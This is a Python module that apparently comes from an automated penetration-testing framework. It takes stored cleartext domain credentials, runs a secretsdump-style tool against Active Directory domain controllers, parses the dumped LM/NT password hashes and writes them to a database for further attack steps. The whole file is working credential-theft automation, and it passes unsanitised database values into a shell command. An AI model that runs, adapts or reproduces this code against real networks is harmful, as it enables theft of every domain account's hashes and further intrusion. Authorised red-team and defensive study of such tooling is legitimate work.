import random
import time
import string
from msf import exploit
import os
import base64

def run(params):
    sql = """
select
    d.id,
    hd.ip_address,
    dc.domain, dc.username, dc.cleartext_password,
    m.id
from
	host_data hd
    join domains d on upper(d.domain_name) = upper(hd.domain)
    join domain_credentials_map m on m.host_data_id = hd.id
    join domain_credentials dc on dc.id = m.domain_credentials_id
where
	hd.footprint_id = %s and 
    d.footprint_id = dc.footprint_id and
    d.footprint_id = hd.footprint_id and
    d.footprint_id = m.footprint_id and
    hd.is_dc = true and
    m.valid = true and
    d.hashes_extracted = false and
	m.psexec_failed = false and
    d.id not in (select item_identifier from task_list where task_descriptions_id = 21 and footprint_id = %s and in_progress = true) and
    hd.ip_address != '10.100.3.22'
"""

    cursor = params.db.cursor()
    cursor.execute(sql, (params.footprint_id, params.footprint_id, ))
    row = cursor.fetchone()
    cursor.close()

    if row != None:
        cursor = params.db.cursor()
        cursor.execute("select addtasklistitem(%s, 21, %s, true, false)", (params.footprint_id, row[0], ))
        task_id = cursor.fetchone()[0]
        cursor.close() 

        delimited_pwd = ""
        for c in row[4]:
            delimited_pwd += "\\" + c


        temp_file_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(6))

        cmd = "./software/adsecretsdump.py {}/{}:{}@{} > temp/{}".format(row[2], row[3], delimited_pwd, row[1], temp_file_name)
        params.log(cmd)
        os.popen(cmd)

        log = os.popen("cat temp/" + temp_file_name).read()
        
        for i in log.split("\n"):
            #if i[-3:] == ":::" and i.lower().find(row[2].lower()) == 0 and i.find("$") == -1:
            if i[-3:] == ":::" and  i.find("$") == -1:
                user = i.split("\\")[1].split(":")[0]
                lm_hash = i.split(":")[2]
                nt_hash = i.split(":")[3]
                print "[{}]\[{}] - [{}:{}]".format(row[2], user, lm_hash, nt_hash)
                cursor = params.db.cursor()
                cursor.execute("select addDomainCreds(%s, 0, %s, %s, '', %s, %s)",  (params.footprint_id, row[2], user, lm_hash, nt_hash, ))
                cursor.close()

        spCursor = params.db.cursor()
        spCursor.execute("select updatetaskstatus(%s, %s, %s, %s::text)",  ( task_id,  False,  True, base64.b64encode("{}\n\n{}".format(cmd, log)), ))
        spCursor.close()
        
        cursor = params.db.cursor()
        cursor.execute("update domains set hashes_extracted = true where id = %s", (row[0], ))
        cursor.close()

        cursor = params.db.cursor()
        cursor.execute("select executetriggers(%s, %s, 11, '');", (params.footprint_id, row[0], ))
        cursor.close()

        #TODO: create and call a trigger called "Domain hashes extracted"
    #else:
    #    params.log("nothing to check")
